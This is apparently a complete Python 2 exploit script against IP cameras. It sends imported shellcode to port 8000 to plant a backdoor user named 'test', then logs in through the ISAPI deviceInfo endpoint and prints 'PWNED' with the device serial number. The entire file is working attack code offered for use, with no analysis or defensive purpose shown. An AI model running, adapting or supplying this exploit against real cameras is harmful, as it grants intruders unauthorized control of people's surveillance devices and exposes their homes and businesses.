
import HTMLParser
import socket
import struct
import sys
import random
import requests

from ys_camera_eop_shellcode import *

DEVICE_DIR='/ISAPI/System/deviceInfo'

class device_resolver (HTMLParser.HTMLParser) :
    def __init__(self) :
        HTMLParser.HTMLParser.__init__(self)
        self.serialNumber=''
        self.deviceID=''
        self.is_serialNumber=False
        self.is_deviceID=False

    def handle_starttag(self,tag,attrs) :
        if 'serialnumber'==tag :
            self.is_serialNumber=True
        elif 'deviceid'==tag :
            self.is_deviceID=True
            
    def handle_data(self,data) :
        if self.is_serialNumber :
            self.serialNumber=data
            self.is_serialNumber=False
        elif self.is_deviceID :
            self.deviceID=data
            self.is_deviceID=False
        
    def get_device_id(self) :
        return self.deviceID
    
    def get_serial_number(self) :
        return self.serialNumber
        
def build_user(ip) :
    binary_buffer=''
    for shellcode_index in shellcode :
        binary_buffer+=struct.pack('B',shellcode_index)
    try :
        control=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        control.connect((ip,8000))
        control.send(binary_buffer)
        control.close()
        print 'EoP System User Success ..'
    except :
        print 'Can\'not Connect to Camera ..'
    
def test_valid(ip) :
    test_pwn=requests.get('http://test:test@'+sys.argv[1]+DEVICE_DIR)
    if 200==test_pwn.status_code :
        resolver_information=device_resolver()
        resolver_information.feed(test_pwn.text)
        print 'PWNED '+resolver_information.get_serial_number()+' Success'
    else :
        print 'ERROR'
    
if 2==len(sys.argv) :
    build_user(sys.argv[1])
    test_valid(sys.argv[1])
else :
    print 'usage : ys_camera_eop_exp.py %camera_ip%'
